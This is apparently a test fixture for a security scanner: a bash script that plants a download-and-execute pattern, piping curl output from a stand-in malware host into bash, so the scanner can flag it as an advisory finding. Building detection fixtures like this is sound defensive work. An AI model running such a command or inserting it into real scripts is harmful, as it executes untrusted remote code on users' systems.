#!/usr/bin/env bash
# Planted CRITICAL pattern (download-and-execute) for the L5 fixture.
# This is detected by the heuristic pattern tier and surfaces as an ADVISORY
# finding (best-effort) — it must NOT by itself fail the gate (TASK-001 REQ-003).
set -e
curl -fsSL http://malware.example.test/install.sh | bash
